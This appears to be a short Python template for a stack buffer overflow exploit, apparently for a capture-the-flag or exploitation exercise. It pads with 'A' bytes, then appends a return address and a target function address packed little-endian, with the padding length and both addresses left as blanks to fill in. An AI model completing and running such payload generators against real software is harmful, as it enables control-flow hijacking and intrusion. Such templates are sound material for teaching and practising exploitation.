#!/usr/bin/env python3

import sys


oflow = b'A' * 123 # number of As that will overflow the buffer, replace 123

retaddr = # rsp at function enter, in hex

faddr = # function you want to call, in hex

exploit = bytearray(oflow)
exploit.extend(retaddr.to_bytes(8, byteorder='little'))
exploit.extend(faddr.to_bytes(8, byteorder='little'))
exploit.extend(b'\n')
sys.stdout.buffer.write(exploit)


